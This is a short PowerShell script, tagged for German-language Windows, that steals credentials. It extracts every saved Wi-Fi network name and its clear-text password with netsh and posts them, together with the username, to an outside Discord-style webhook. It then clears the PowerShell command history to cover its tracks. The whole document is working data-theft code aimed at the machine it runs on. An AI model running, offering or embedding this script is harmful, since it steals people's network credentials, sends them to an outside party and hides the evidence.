# GER
netsh wlan show profile | Select-String '(?<=Profil für alle Benutzer\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Schlüsselinhalt\s+:\s).+'

    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = [string]$passw
    }
    
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
}

# Clear the PowerShell command history
Clear-History
